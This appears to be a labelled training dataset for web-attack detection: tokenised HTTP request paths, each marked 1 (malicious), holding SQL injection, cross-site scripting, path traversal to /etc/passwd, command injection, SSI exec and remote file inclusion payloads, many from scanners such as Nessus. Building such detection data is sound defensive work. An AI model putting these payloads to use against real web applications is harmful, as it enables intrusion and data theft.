sentences 	 labels
/ string / strings / parameters = 1 "  "  )  )  ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  #  \r\n\r\n 	 1
/ jdx255ea . mscgi ?  < script > document . cookie =  " testziyq = 5055 ;  "  <  / script >  \r\n\r\n 	 1
/ index . php ? ilang = xxpathxx ?  \r\n\r\n 	 1
/ manager / bb-hostsvc . sh ? hostsvc =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = < html onmousewheel html onmousewheel =  " javascript : javascript : alert ( 1 )  "  >  <  / html onmousewheel >  \r\n\r\n 	 1
/ help . php ? q =  " sleep 11  #  \r\n\r\n 	 1
/ string / strings / parameters = x�? <  / title >  < img src = x onerror = alert ( 1 )  >  \r\n\r\n 	 1
/ examples / jsp / checkbox / gadgets / blog / blogmodel . php ? path =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = < a href =  " data : text & sol ; html ;  & tab ; base64 & newline ;  , pgjvzhkgb25sb2fkpwfszxj0kdeppg =  =  "  > click < test >  \r\n\r\n 	 1
/ help . php ? q =  " ver ,  > q74835818 & rem ,  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  in boolean mode )  union all select null , null , null #  \r\n\r\n 	 1
/ 7dbjwpw6 . dll ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ myphpcommander_path / system / lib / package . php ? gl_root = xxpathxx ? cmd  \r\n\r\n 	 1
/ string / strings / parameters = &  < script > alert (  ' xss '  )  ;  <  / script >  "  "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  union all select null , null , null , null , null , null , null , null --  \r\n\r\n 	 1
/ string / strings / parameters = -4484 '  )  )  or 6872 = 6872 and  (  (  ' oxuo '  =  ' oxuo  \r\n\r\n 	 1
/ javascript / ping . exe  \r\n\r\n 	 1
/ string / id = 1 & nombre = vino + rioja & precio = 100 & cantidad =  ' or ' a =  ' a & b1 = aadir + al + carrito  \r\n\r\n 	 1
/  ?  < script > document . cookie =  " testtbjy = 7334 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 6f + 61 + 64 + 4c + 69 + 62 + 72 + 61 + 72 + 79 + 41 + 00 + 00 + 00 + 00 + 47 + 65 + 74 + 50 + 72 + 6f + 63 + 41 + 64 + 64 +  +  >  > esbq  \r\n\r\n 	 1
/ egaet53a . jspa ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ kmitaadmin / kmitam / htmlcode . php ? file = xxpathxx ?  \r\n\r\n 	 1
/ string / strings / parameters = -9050 union all select 9346 , 9346 , 9346 , 9346 , 9346 , 9346 , 9346 , 9346 , 9346 , 9346 --  \r\n\r\n 	 1
/ string / strings / parameters = |   [  7 -ne  $  ( echo gqzijb  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ javascript / auction . exe  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  )  and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  \r\n\r\n 	 1
/ igtf0zon . jspa ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ jw64yq8u . cgi ?  < script > document . cookie =  " testylfu = 1313 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  )  rlike sleep ( 5 )  #  \r\n\r\n 	 1
/ ygkjkngd . jspa ?  < meta http-equiv = set-cookie content =  " testnago = 4518 "  >  \r\n\r\n 	 1
/ gy23xnjq . php3 ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ main . php ? stuff =  "  & del \ x09q89486418 & rem \ x09  \r\n\r\n 	 1
/ string / strings / parameters = |   [  6 -ne  $  ( echo pdveeq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \r\n\r\n 	 1
/ string / strings / parameters = -9331 '  or  ( 4519 = 2912 )  * 2912 and  ' rddk '  =  ' rddk  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select  ' ozpm '  where 6939 = 6939 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  )  +  '  \r\n\r\n 	 1
/ manager / html ; jsessionid = 8c46789d19abadf0888a3b406a3d1441 ? org . apache . catalina . filters . csrf_nonce = ba2f57ae4d6ec3af51ddecd681e24205  \r\n\r\n 	 1
/ main . php ? stuff =  "  & ver & rem \ x09  \r\n\r\n 	 1
/ i2n4v4rl . cfm ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ' hgwt '  like  ' hgwt  \r\n\r\n 	 1
/ javascript / footers . exe  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 --  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo aybjiv )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  '  \r\n\r\n 	 1
/ string / strings / parameters = <  / title >  < script > document . cookie = true ;  <  / script >  \r\n\r\n 	 1
/ string / b2 = vaciar + carrito '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  \r\n\r\n 	 1
/ cgi-bin / view_user . php ? list = 1 & letter =  & sort_by =  ' select  \r\n\r\n 	 1
/ string / strings / parameters = echo $ ifszbtjiz $  (  ( 28 + 56 )  )  $  ( echo $ ifszbtjiz ) zbtjiz |  \r\n\r\n 	 1
/ string / strings / parameters = or a = a --  \r\n\r\n 	 1
/ string / strings / parameters = *  { color : red }  <  / style >  /  /  [  "  '  `  --  >  ]  ]  >  ]  <  / div >  \r\n\r\n 	 1
/ o35zot2r . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = '  ; echo cwxayu $  (  ( 62 + 81 )  )  $  ( echo cwxayu ) cwxayu  \r\n\r\n 	 1
/ xlj7h65o . mscgi ?  < script > document . cookie =  " testtbbe = 856 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  and exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8190 = 8190 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  "  " oyuj "  "  =  "  " oyuj  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  '  %  '  =  '  \r\n\r\n 	 1
/  < meta http-equiv = set-cookie content =  " testwews = 8477 "  >  \r\n\r\n 	 1
/ javascript / document . ora  \r\n\r\n 	 1
/ string / strings / parameters = '  echo oupqqd $  (  ( 2 + 0 )  )  $  ( echo oupqqd ) oupqqd &  \r\n\r\n 	 1
/ string / strings / parameters = &  & echo lderrf $  (  ( 18 + 3 )  )  $  ( echo lderrf ) lderrf &  \r\n\r\n 	 1
/ script / _conf / core / common-tpl-vars . php ? confdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  ?  \r\n\r\n 	 1
/ fnwhrxyd . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / id = 3 & nombre = vino +  .  *  ? rioja & precio = 39 & cantidad = 38 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  ; ls + -l ;  / tmp / ukirnkmpbn ;  "  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  and elt ( 3247 = 3969 , 3969 )  and  ' xcbm '  like  ' xcbm  \r\n\r\n 	 1
/ string / modo = registro & login = snarr & password = aocar & nombre = romari & apellidos = astorga & email = laine-devlin @ telogis . tl & dni = 38236531c & direccion = carlos + maurras ,  + 53 +  & ciudad = brazatortas & cp = 47318 < script > alert (  " paros "  )  ;  <  / script >  & provincia = teruel & ntc = 1539106035022120 & b1 = registrar  \r\n\r\n 	 1
/ lmw4r201 . idc ?  < script > document . cookie =  " testwews = 8477 ;  "  <  / script >  \r\n\r\n 	 1
/ g3w7y7u5 . idc ?  < script > document . cookie =  " testbfpq = 3326 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select niht where 7294 = 7294 and 3580 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  \r\n\r\n 	 1
/ odzk29aa . jspa ?  < meta http-equiv = set-cookie content =  " testtfvh = 2141 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo jzojbe )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  \r\n\r\n 	 1
/ string / id = 1 & nombre = vino + rioja & precio = 85 /  & cantidad = 6 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ string / strings / parameters = -3364 %  "  "  )  )  )  union all select 5464 --  \r\n\r\n 	 1
/ string / strings / parameters = ; echo $ ifsmsqsjk $  (  ( 23 + 24 )  )  $  ( echo $ ifsmsqsjk ) msqsjk &  \r\n\r\n 	 1
/ files / folder-rename . php3 ? bsx_libdir = xxpathxx  \r\n\r\n 	 1
/ main . php ? stuff =  " ping \ xa0-w \ xa08000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  \r\n\r\n 	 1
/ string / modo = registro & login = pilcher & password = 0int67no & nombre =  \r\n\r\n 	 1
/ scripts / mundimail / template / simpledefault / admin / _masterlayout . php ? top = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  \r\n\r\n 	 1
/ string / strings / parameters = )  or  ( a = a  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  ' skdm '  =  ' skdm  \r\n\r\n 	 1
/ recordings / misc / audio . php ? recording =  .  .  / version . inc  \r\n\r\n 	 1
/ string / modo = insertar & precio = 2714 & b1 = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  "  " ssfu "  "  =  "  " ssfu  \r\n\r\n 	 1
/ string / strings / parameters = < img src =  ' vbscript : msgbox (  "  " crosssitescripting "  "  )  '  >  \r\n\r\n 	 1
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1332008595 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = < meta http-equiv =  "  " refresh "  "  content =  "  " 0 ;  url = http :  /  /  ; url = javascript : alert (  ' crosssitescripting '  )  ;  "  "  >  \r\n\r\n 	 1
/ modules / groups / headerfile . php ? system [ path ]  = xxpathxx  \r\n\r\n 	 1
/ string / modo = registro & login = jarrett & password = ale7a2de8 & nombre = oseas & apellidos = quihuata + cervell & email = stockel6 @  @ sexplorador .  @ om & dni = 92257096w & direccion = pisuerga + 132 +  & ciudad = pelayos + de + la + presa & cp = 36658 & provincia = lugo & ntc = 9649891877150082 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  '  %  '  =  '  \r\n\r\n 	 1
/ edv3mapy . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ examples / jsp / colors / activatemember ? activatecode =  & member =  "  >  < script > alert (  ' mvnforum_activatemember_xss . nasl '  )  <  / script >  \r\n\r\n 	 1
/ edzaia0i . nsf ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo wudxts )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 1
/ string / modo = entrar & login = sabry & pwd =  / 31l ' pa0t , e & remember = off & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  "  " nnmz "  "  like  "  " nnmz  \r\n\r\n 	 1
/ help . php ? q =  '  \ x0adel q61886362  #  \r\n\r\n 	 1
/ utilitaires / gestion_sondage . php ? repertoire_visiteur = xxpathxx  \r\n\r\n 	 1
/ string / modo = entrar ?  & login = suh9 & pwd = 4ar9ues4a & remember = off & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 500 )  ; alert ( 1 )  ;  /  /  \r\n\r\n 	 1
/ en-us / dda2qr7j . fts ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ examples / servlets / servlet / cal_event . php ? id = 1 '  union select 1 , 2 ,  ' calendarix_id_sql_injection . nasl '  , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 --  \r\n\r\n 	 1
/ string / strings / parameters = '  waitfor delay  ' 0 : 0 : 50 '  ;  --  \r\n\r\n 	 1
/  \  .  .  /  \  .  .  /  \  .  .  /  \  .  .  /  \  .  .  /  \  .  .  /  \r\n\r\n 	 1
/ string / modo = registro & login = jakeman & password = c0a428o & nombrea = carolina & apellidos = pepiol + acho & email = juergens-shear @ imarbella . dm & dni = 13717151c & direccion = vicent + andreu + estelles ,  + 106 + 1 ? e & ciudad = mata + de + los + olmos ,  + la & cp = 20217 & provincia = girona & ntc = 5088681295774264 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = <  !  --  # exec cmd =  " cat  / etc / passwd "   --  >  < br /  >  \r\n\r\n 	 1
/ fc9t54l7 . mscgi ?  < meta http-equiv = set-cookie content =  " testggad = 2000 "  >  \r\n\r\n 	 1
/ string / modo = registro & login = ousterho & passworda = import ! ador & nombre = leinad & apellidos = alabart & email = koyama @ civicosdns . jp & dni = 19113499q & direccion = c /  + silvinita + 95 ,  + 11d & ciudad = cordobilla + de + lcara & cp = 16800 & provincia = cuenca & ntc = 9775185207171671 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = < br >  < br >  < br >  < br >  < br >  < br >  < br >  < br >  < br >  < br >  \r\n\r\n 	 1
/  < script > cross_site_scripting . nasl <  / script >  . cfc  \r\n\r\n 	 1
/ string / strings / parameters = '  & echo $ ifsrropxw $  (  ( 41 + 77 )  )  $  ( echo $ ifsrropxw ) rropxw \  \  \r\n\r\n 	 1
/ string / str =  $  ( echo byujus )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo bjmmjx )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  and elt ( 5345 = 8751 , 8751 )  and  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ 3hlysl2x . php3 ?  < meta http-equiv = set-cookie content =  " testgjbe = 8505 "  >  \r\n\r\n 	 1
/ bin / fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd  \r\n\r\n 	 1
/ search / submit . php ? config [  " sipssys "  ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  \r\n\r\n 	 1
/ string / strings / parameters = or x = y --  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  and  "  " wsmz "  "  like  "  " wsmz  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo poekqx )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 1
/  " they told you so "  /  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select  ' aphz '  where 1933 = 1933 union all select null , null , null , null , null , null #  \r\n\r\n 	 1
/ copying /  <  / p >  < body >  < script / src =  " http :  /  / www . example . com / test ? rnd = q66174257 "  >  <  / script >  < p >  \r\n\r\n 	 1
/ ap58k3ci . jsp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ cgi-bin / demos / demo . browse . php ? filename =  / etc / passwd  \r\n\r\n 	 1
/ main . php ? logout =  "  & ver \ x0b > q41987339 & rem \ x0b  \r\n\r\n 	 1
/ top . php ? stuff =  " ping \ xa0-w \ xa08000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  \r\n\r\n 	 1
/  ~ nobody / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo jtlwwu )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 1
/ main . php ? stuff =  "  \ x0adel q45664393  #  \r\n\r\n 	 1
/ phpmyadmin / sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = < path d =  " m0 , 0 "  style =  " marker-start : url ( test4 . svg # a )  "  /  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual  \r\n\r\n 	 1
/ t7tm4m0b . htm ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ nmw0do67 . dll ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = '  ;  str =  $  ( echo aujgtn )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = < b / alt =  " 1 " onmouseover = inputbox + 1 language = vbs > test <  / b >  \r\n\r\n 	 1
/ examples / servlets / servlet / index . php ? configfile =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo jicoqs )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 1
/ e9rx3ya4 . kspx ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ javascript / removal . exe  \r\n\r\n 	 1
/ en-us / odzk29aa . exe ?  < meta http-equiv = set-cookie content =  " testtfvh = 2141 "  >  \r\n\r\n 	 1
/ fmnveedu . html ?  < meta http-equiv = set-cookie content =  " testgfbr = 7014 "  >  \r\n\r\n 	 1
/ vjbrrppi . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ examples / jsp / sessions / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select pwvr where 3028 = 3028 or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  as juxt where 5956 = 5956 and 8148 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  rlike sleep ( 5 )  #  \r\n\r\n 	 1
/ string / modo = registro & login = thuy & password = vafosa & nombre = tosca & apellidos = picaol + pedreira & email =  @ cr @ anh @ am @ 4horas . ki & dni = 80624196l & direccion = igualada ,  + 157 +  & ciudad = breda & cp = 08348 & provincia = segovia & ntc = 2333713014492030 & b1 = registrar  \r\n\r\n 	 1
/ string / modo = registro & login =  , s / i * v & password = d . o4a56n & nombre = josua & apellidos = negrete & email = haworth @ rockefeller . uk & dni = 32230670b & direccion = calle + pura + e + dora + vazquez + 12 ,  + 7d & ciudad = padul & cp = 19307 & provincia = almera & ntc = 9549023942251189 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  as kdse where 6767 = 6767 rlike sleep ( 5 )  #  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  as wezj where 2869 = 2869 and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  --  \r\n\r\n 	 1
/ q703m78q . nsf ?  < meta http-equiv = set-cookie content =  " testvowq = 604 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select xzvf where 9727 = 9727 ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  #  \r\n\r\n 	 1
/ examples / jsp / num / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331904458 '  ,  ' 5 '  --  \r\n\r\n 	 1
/ string / strings / parameters = ' echo uvxcgd $  (  ( 51 + 43 )  )  $  ( echo uvxcgd ) uvxcgd \  \r\n\r\n 	 1
